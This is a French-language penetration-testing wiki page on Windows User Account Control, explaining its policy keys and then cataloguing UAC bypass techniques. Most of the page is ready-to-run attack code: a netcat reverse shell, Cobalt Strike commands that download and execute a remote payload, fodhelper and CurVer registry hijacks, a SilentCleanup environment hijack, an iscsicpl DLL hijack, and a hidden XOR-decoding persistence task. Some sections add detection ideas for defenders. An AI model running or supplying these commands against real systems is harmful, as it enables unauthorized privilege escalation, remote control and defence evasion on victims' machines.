# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **demande de consentement pour les activités nécessitant une élévation de privilèges**. Les applications possèdent différents niveaux d’`integrity`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque l’UAC est activé, les applications et les tâches s’**exécutent toujours dans le contexte de sécurité d’un compte non administrateur**, sauf si un administrateur autorise explicitement ces applications/tâches à disposer d’un accès de niveau administrateur au système pour s’exécuter. Il s’agit d’une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais elle n’est pas considérée comme une boundary de sécurité.<sup>[[2]](#references)</sup>

Pour plus d’informations sur les niveaux d’intégrité :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsqu’un UAC est en place, un utilisateur administrateur reçoit 2 tokens : un token utilisateur standard, pour effectuer les actions ordinaires avec une intégrité moyenne, et un autre avec les privilèges administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l’UAC et inclut le processus de connexion, l’expérience utilisateur et l’architecture de l’UAC.<sup>[[2]](#references)</sup> Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l’UAC en fonction de leur organisation au niveau local (à l’aide de secpol.msc), ou le configurer et le déployer via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont expliqués en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de stratégie de groupe qui peuvent être définis pour l’UAC. Le tableau suivant fournit des informations supplémentaires :

| Paramètre de stratégie de groupe                                                                                                                                                                                                                                                                                                                                                           | Clé de registre                | Paramètre par défaut                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Mode d’approbation administrateur pour le compte Administrateur intégré](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Désactivé)                                             |
| [User Account Control: Comportement de la demande d’élévation pour les administrateurs en mode d’approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Demander le consentement pour les binaires non-Windows sur le bureau sécurisé) |
| [User Account Control: Comportement de la demande d’élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Demander les informations d’identification sur le bureau sécurisé)         |
| [User Account Control: Détecter les installations d’applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Activé ; désactivé par défaut sur Enterprise)           |
| [User Account Control: Élever uniquement les exécutables signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Désactivé)                                             |
| [User Account Control: Élever uniquement les applications UIAccess installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Activé)                                              |
| [User Account Control: Exécuter tous les administrateurs en mode d’approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Activé)                                              |
| [User Account Control: Autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Désactivé)                                             |
| [User Account Control: Basculer vers le bureau sécurisé lors d’une demande d’élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Activé)                                              |
| [User Account Control: Virtualiser les échecs d’écriture de fichiers et du registre vers des emplacements propres à chaque utilisateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Activé)                                              |

### Stratégies pour installer des logiciels sur Windows

Les **stratégies de sécurité locales** (`secpol.msc` sur la plupart des systèmes) sont configurées par défaut pour **empêcher les utilisateurs non administrateurs d’effectuer des installations de logiciels**. Cela signifie que même si un utilisateur non administrateur peut télécharger l’installeur de votre logiciel, il ne pourra pas l’exécuter sans un compte administrateur.

### Clés de registre pour forcer l’UAC à demander une élévation

En tant qu’utilisateur standard sans droits administrateur, vous pouvez vous assurer que le compte « standard » **doit fournir ses informations d’identification via l’UAC** lorsqu’il tente d’effectuer certaines actions. Cette action nécessite de modifier certaines **clés de registre**, pour lesquelles des permissions administrateur sont nécessaires, à moins qu’il n’existe un **UAC bypass**, ou que l’attaquant soit déjà connecté en tant qu’administrateur.

Même si l’utilisateur appartient au groupe **Administrators**, ces modifications obligent l’utilisateur à **saisir à nouveau les informations d’identification de son compte** pour effectuer des actions administratives.

**En pratique, cela n’est utile qu’une fois que vous disposez déjà d’un token élevé, d’un UAC bypass ou d’une mauvaise configuration permettant de modifier ces clés ; sinon, l’écriture dans le registre elle-même est bloquée.**

Les clés et entrées de registre que vous devez modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Cela peut également être effectué manuellement via l’outil de stratégie de sécurité locale. Une fois ces valeurs modifiées, les opérations administratives demandent à l’utilisateur de saisir à nouveau ses informations d’identification.

### Remarque

**L’User Account Control n’est pas une boundary de sécurité.** Par conséquent, les utilisateurs standard ne peuvent pas sortir de leur compte et obtenir des droits administrateur sans un exploit d’élévation de privilèges local.

### Demander un « accès complet à l’ordinateur » à un utilisateur
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode utilise des vérifications d’intégrité pour empêcher les processus de niveau d’intégrité élevé (comme les navigateurs web) d’accéder aux données de niveau d’intégrité faible (comme le dossier des fichiers Internet temporaires). Cela est réalisé en exécutant le navigateur avec un token de faible intégrité. Lorsque le navigateur tente d’accéder aux données stockées dans la zone de faible intégrité, le système d’exploitation vérifie le niveau d’intégrité du processus et autorise l’accès en conséquence. Cette fonctionnalité aide à empêcher les attaques d’exécution de code à distance d’accéder aux données sensibles du système.
- Lorsqu’un utilisateur ouvre une session sur Windows, le système crée un token d’accès contenant la liste des privilèges de l’utilisateur. Les privilèges sont définis comme la combinaison des droits et des capacités d’un utilisateur. Le token contient également la liste des credentials de l’utilisateur, qui sont utilisés pour authentifier l’utilisateur auprès de l’ordinateur et des ressources du réseau.

### Autoadminlogon

Pour configurer Windows afin qu’il ouvre automatiquement une session avec un utilisateur spécifique au démarrage, définissez la **`AutoAdminLogon` registry key**. Cela est utile dans les environnements kiosk ou à des fins de test. Utilisez cette configuration uniquement sur des systèmes sécurisés, car elle expose le mot de passe dans le registre.

Définissez les clés suivantes à l’aide de l’Éditeur du Registre ou de `reg add` :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` :
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Pour revenir au comportement normal d’ouverture de session, définissez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Notez que si vous disposez d’un accès graphique à la victime, le UAC bypass est simple, car il suffit de cliquer sur « Yes » lorsque l’invite UAC apparaît.

Le UAC bypass est nécessaire dans la situation suivante : **l’UAC est activé, votre processus s’exécute dans un contexte d’intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu’il est **beaucoup plus difficile de bypass l’UAC lorsqu’il est configuré au niveau de sécurité le plus élevé (Always) que lorsqu’il est configuré à l’un des autres niveaux (Default).**

### Fast triage from a medium-integrity shell

Avant d’essayer un bypass, confirmez que vous êtes dans le bon scénario et identifiez le build de l’hôte afin de le faire correspondre aux méthodes connues comme fonctionnelles :
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notes pratiques :
- Si `EnableLUA=0`, vous n’avez pas besoin de bypass : n’importe quel token administrateur peut directement demander un niveau d’intégrité élevé.
- `ConsentPromptBehaviorAdmin=2` ou `5` est le scénario courant pour les bypass auto-elevate / basés sur COM.
- `Always Notify` augmente le niveau de difficulté, mais vous devez tout de même tester la build exacte au lieu de supposer un échec : UACME répertorie encore certaines méthodes `AlwaysNotify compatible` sur les builds modernes de Windows.<sup>[[3]](#references)</sup>

### UAC désactivé

Si UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un reverse shell avec des privilèges administrateur** (niveau d’intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### RPC local + objet de débogage réutilisable

L'interface RPC locale `201ef99a-7fa0-444c-9399-19ba84f12a1a` peut créer un processus avec le débogage activé. Les processus créés par le débogueur sur le même thread partagent l'objet de débogage du thread ; un événement de débogage de création contient un handle de processus avec un accès total, même lorsque le résultat RPC lui-même n'accorde qu'un accès limité. Cela transforme la réutilisation de l'objet de débogage en primitive UAC pour un membre du groupe Administrators avec une intégrité moyenne.<sup>[[11]](#references)[[12]](#references)</sup>

Une chaîne pratique est la suivante :<sup>[[11]](#references)[[12]](#references)</sup>

1. Appeler la méthode RPC locale (directement ou via `NdrAsyncClientCall`) pour créer un processus sacrifiable non élevé avec le débogage activé.
2. Interroger `ProcessDebugObjectHandle` avec `NtQueryInformationProcess`, le détacher avec `NtRemoveProcessDebug`, conserver l'objet et terminer le processus sacrifiable.
3. Utiliser la même interface RPC pour créer un processus trusted auto-elevated, puis associer l'objet enregistré au thread appelant via `DbgUiSetThreadDebugObject`.
4. Appeler `WaitForDebugEvent` et récupérer le handle de processus `CREATE_PROCESS_DEBUG_EVENT` ; le dupliquer avec `NtDuplicateObject` avant de continuer.
5. Fournir le handle dupliqué à `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` et lancer le payload avec une structure extended startup-info. Cela réutilise à la fois le contexte du processus élevé et donne à l'enfant une relation parent trusted en apparence.

Rechercher la courte séquence plutôt que seulement le binaire auto-elevated : création de processus via le RPC local AppInfo, requêtes `ProcessDebugObjectHandle`, détachement/rattachement du débogueur, événement immédiat de débogage de création, duplication de handle et enfant dont le parent enregistré ne correspond pas au processus ayant effectué les APIs de création.<sup>[[12]](#references)</sup>

### **Très** simple UAC "bypass" (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur appartenant au groupe Administrators, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout le contenu du système de fichiers** (même au dossier personnel de l'Administrator).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass avec Cobalt Strike

Les techniques de Cobalt Strike fonctionneront uniquement si l’UAC n’est pas configuré sur son niveau de sécurité maximal
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** disposent également de plusieurs modules pour **bypass** le **UAC**.

### Interfaces COM élevées (`ICMLuaUtil` / `CMSTPLUA`)

Les objets COM auto-élevés restent une surface UAC pratique sur les builds modernes. `ICMLuaUtil` est toujours référencé par UACME comme fonctionnel sur les branches actuelles de Windows, et les outils offensifs continuent d'adapter `CMSTPLUA` en combinant un processus du bureau interactif, une exécution 64-bit et parfois un masquerading du PEB/processus avant d'invoquer le COM Elevation Moniker.<sup>[[3]](#references)</sup>

Conseils pratiques :
- Privilégiez un processus **64-bit** dans la **session interactive** de l'utilisateur (généralement `explorer.exe` ou un processus enfant).
- Si un shell brut échoue, réessayez depuis un BOF / une implémentation UACME plutôt qu'avec un simple wrapper `CreateProcess`.
- Attendez-vous à ce que l'exécution enfant se produise dans un **processus élevé distinct** ; de nombreux BOF n'élèvent pas le beacon actuel sur place.

### KRBUACBypass

Documentation et outil sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) est un ensemble de techniques de bypass UAC. Compilez-le avec Visual Studio ou MSBuild ; le build crée plusieurs exécutables (par exemple, `Source\Akagi\output\x64\Debug\Akagi.exe`), sélectionnez donc la méthode appropriée pour le build ciblé.<sup>[[3]](#references)</sup>\
Attention : certains bypass lancent des programmes visibles ou des invites susceptibles d'alerter l'utilisateur.<sup>[[3]](#references)</sup>

UACME indique le **build version à partir duquel chaque technique a commencé à fonctionner**.<sup>[[3]](#references)</sup> Vous pouvez rechercher une technique affectant vos versions :
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, vous obtenez la version Windows `1607` à partir des versions de build.

Un workflow pratique consiste d’abord à **évaluer le build de l’hôte**, puis à lancer la méthode correspondante :
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compare rapidement le build local avec ses méthodes UAC connues, ce qui permet d’écarter rapidement les PoC obsolètes.<sup>[[4]](#references)</sup>
- `UACME` reste le meilleur catalogue public pour associer un bypass à un build précis. La version 3.7.1 a ajouté les méthodes 83–85, tandis que la release précédente a re-testé les méthodes existantes avec **Windows 11 25H2** ; vérifiez à nouveau le tableau des méthodes et les notes de release au lieu de supposer qu’un ancien PoC s’applique toujours sans modification.<sup>[[3]](#references)[[9]](#references)</sup>

### Chaînes WNF/UIAccess compatibles avec Always Notify (UACME 3.7.1)

`Always Notify` n’élimine pas tous les UAC bypass. UACME 3.7.1 implémente trois nouvelles méthodes x64 qui combinent un état d’environnement/protocole contrôlé par l’utilisateur avec le comportement de tâches planifiées élevées ou de UIAccess, et les marque toutes comme `AlwaysNotify compatible` :<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** rediriger `SystemRoot` afin que la `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` déclenchée par WNF fasse effectuer à `taskhostw.exe` avec des privilèges élevés un side-load de `unifiedconsent.dll`. UACME le prend en charge depuis le build 19041 de Windows 10.
- **84 — TabTip:** utiliser la même primitive de variable d’environnement contre `TabTip.exe` avec UIAccess, qui charge `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ou `rsaenh.dll` selon le build, puis pivoter depuis le contexte UIAccess à haute intégrité obtenu. UACME le prend en charge depuis Windows 8.1 / Server 2016.
- **85 — Narrator:** détourner le protocole `feedback-hub` propre à l’utilisateur, contrôler Narrator avec `Alt+CapsLock+F`, puis lancer une copie inscriptible de `osk.exe` qui effectue un side-load de `OskSupport.dll`. Cette méthode nécessite un bureau interactif et est prise en charge depuis Windows 10 1809 / Server 2019.

Après avoir construit les unités de payload et Akagi comme l’indique UACME, invoquez le numéro de méthode correspondant (la commande facultative utilise `cmd.exe` par défaut) :
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Les méthodes 84 et 85 dépendent de UIAccess et de l’interaction avec le desktop ; ne vous attendez donc pas à ce qu’elles fonctionnent telles quelles depuis la Session 0 ou un shell de service non interactif. Les trois méthodes modifient l’état de l’environnement et du protocole, et déploient des DLL ; inspectez l’implémentation et supprimez ces artefacts après les tests.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire approuvé `fodhelper.exe` est automatiquement élevé sur les versions modernes de Windows. Lorsqu’il est lancé, il interroge le chemin de registre par utilisateur ci-dessous sans valider le verbe `DelegateExecute`. Y placer une commande permet à un processus de Medium Integrity (l’utilisateur appartient au groupe Administrators) de lancer un processus de High Integrity sans invite UAC.

Chemin de registre interrogé par fodhelper :
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes :
- Fonctionne lorsque l’utilisateur actuel est membre de `Administrators` et que le niveau d’UAC est défini sur la valeur par défaut/lenient (pas sur Always Notify avec des restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour démarrer un PowerShell 64 bits depuis un processus 32 bits sur Windows 64 bits.
- Le payload peut être n’importe quelle commande (PowerShell, cmd ou chemin vers un EXE). Évitez les interfaces qui affichent des invites pour plus de discrétion.

#### CurVer/extension hijack variant (HKCU only)

Des échantillons récents abusant de `fodhelper.exe` évitent `DelegateExecute` et redirigent plutôt le ProgID `ms-settings` via la valeur `CurVer` par utilisateur. Le binaire auto-élevé résout toujours le gestionnaire sous `HKCU`, de sorte qu’aucun jeton administrateur n’est nécessaire pour créer les clés :<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Une fois les privilèges élevés, les malwares **désactivent généralement les futures invites** en définissant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectuent une évasion supplémentaire des défenses (par exemple, `Add-MpPreference -ExclusionPath C:\ProgramData`) et recréent la persistence pour s’exécuter avec une intégrité élevée. Une tâche de persistence typique stocke sur le disque un **script PowerShell chiffré avec XOR**, puis le décode et l’exécute en mémoire toutes les heures&nbsp;:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Cette variante supprime toujours le **`dropper`** et ne laisse que les payloads staged, ce qui fait que la détection repose sur la surveillance du **détournement de `CurVer`**, de la modification de `ConsentPromptBehaviorAdmin`, de la création d’exclusions Defender ou des tâches planifiées qui déchiffrent PowerShell en mémoire.<sup>[[5]](#references)</sup>

### UAC bypass via la tâche `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` lance `cleanmgr.exe` avec les privilèges les plus élevés et développe `%windir%` à partir de l’environnement utilisateur. Si vous contrôlez `HKCU\Environment\windir`, vous pouvez rediriger cette expansion vers une commande arbitraire et obtenir une intégrité élevée sans boîte de dialogue de consentement.<sup>[[8]](#references)</sup> Cette méthode mérite toujours d’être testée sur les builds récentes, car UACME maintient la technique active et le suivi des problèmes récents indique que Windows 11 24H2 pourrait ne nécessiter que de petits ajustements de guillemets.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Si la tâche ajoute des guillemets au chemin sur ce build, réessayez avec le payload se terminant par un guillemet (par exemple `cmd.exe"`). Nettoyez toujours `HKCU\Environment\windir` après les tests.

#### More UAC bypass

De nombreux UAC bypass classiques qui exploitent les flux d’interface, les objets COM ou les interactions avec le bureau nécessitent une **session interactive complète** avec la victime ; un shell `nc.exe` classique ou un service s’exécutant dans la **Session 0** ne suffit souvent pas.

Vous pouvez souvent résoudre ce problème avec une session **meterpreter**. Migrez vers un **processus** dont la valeur **Session** est égale à **1** :

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### UAC Bypass with GUI

Si vous avez accès à une **GUI**, vous pouvez simplement accepter l’invite UAC lorsqu’elle apparaît ; vous n’avez pas réellement besoin d’un bypass technique. Par conséquent, l’obtention d’une session GUI suffit souvent à contourner les contraintes pratiques ajoutées par l’UAC.

De plus, si vous obtenez une session GUI utilisée par quelqu’un (potentiellement via RDP), **certains outils s’exécuteront en tant qu’administrateur** et vous pourrez **exécuter** directement un **cmd**, par exemple **en tant qu’administrateur**, sans être à nouveau invité par l’UAC, comme avec [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela peut être un peu plus **stealthy**.

### Noisy brute-force UAC bypass

Si le bruit généré est acceptable, un outil tel que [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) peut demander à plusieurs reprises une élévation jusqu’à ce que l’utilisateur l’accepte.

### Your own bypass - Basic UAC bypass methodology

Si vous examinez **UACME**, vous remarquerez que **de nombreux UAC bypass exploitent le DLL hijacking** (souvent en faisant charger à un binaire élevé une DLL contrôlée par l’attaquant depuis un chemin accessible en écriture). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui s’**autoelevate** (vérifiez que lorsqu’il est exécuté, il s’exécute avec un niveau d’intégrité élevé).
2. Avec procmon, recherchez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous devrez probablement **écrire** la DLL dans certains **chemins protégés** (comme C:\Windows\System32), où vous n’avez pas les permissions d’écriture. Vous pouvez contourner ce problème avec :
1. **wusa.exe** : Windows 7, 8 et 8.1. Il permet d’extraire le contenu d’un fichier CAB dans des chemins protégés (car cet outil est exécuté avec un niveau d’intégrité élevé).
2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le chemin protégé et exécuter le binaire vulnérable et autoelevated.

### Another UAC bypass technique

Elle consiste à vérifier si un **binaire autoElevated** tente de **lire** dans le **registre** le **nom/chemin** d’un **binaire** ou d’une **commande** à **exécuter** (c’est plus intéressant si le binaire recherche ces informations dans **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Le binaire 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` est un binaire **auto-elevated** qui peut être exploité pour charger `iscsiexe.dll` selon l’ordre de recherche. Si vous pouvez placer un `iscsiexe.dll` malveillant dans un dossier **accessible en écriture par l’utilisateur**, puis modifier le `PATH` de l’utilisateur actuel (par exemple via `HKCU\Environment\Path`) afin que ce dossier soit recherché, Windows peut charger la DLL de l’attaquant dans le processus élevé `iscsicpl.exe` **sans afficher d’invite UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notes pratiques :
- Cette technique est utile lorsque l’utilisateur actuel appartient au groupe **Administrators**, mais s’exécute avec une **Medium Integrity** en raison de l’UAC.
- La copie **SysWOW64** est celle qui nous intéresse pour ce bypass. Considérez la copie **System32** comme un binaire distinct et validez son comportement indépendamment.
- La primitive combine l’**auto-elevation** et le **DLL search-order hijacking** ; le même workflow ProcMon que celui utilisé pour les autres UAC bypass est donc utile pour valider le chargement de la DLL manquante.

Flux minimal :
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idées de détection :
- Déclencher une alerte lors de l’utilisation de `reg add` / écritures dans le registre vers `HKCU\Environment\Path` immédiatement suivie de l’exécution de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Rechercher `iscsiexe.dll` dans des emplacements **contrôlés par l’utilisateur** tels que `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Corréler les lancements de `iscsicpl.exe` avec des processus enfants inattendus ou des chargements de DLL depuis des répertoires Windows non standard.

### Nouvelles recherches à vérifier séparément

Certaines chaînes post-2024 ne ressemblent plus aux détournements classiques du registre `HKCU\Software\Classes`. Par exemple, l’empoisonnement du cache du contexte d’activation peut combiner un **remappage de lecteur** et une **redirection de DLL** afin de passer d’une intégrité moyenne à une intégrité élevée via des binaires d’interface utilisateur de confiance / à élévation automatique tels que `ctfmon.exe`, puis des cibles plus récentes comme `fodhelper.exe`. Au lieu de reproduire ici le large PoC, consultez les exemples de payloads compacts dans :

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (aperçu) : détournement de lettre de lecteur via la table des périphériques DOS par session de connexion

> [!NOTE]
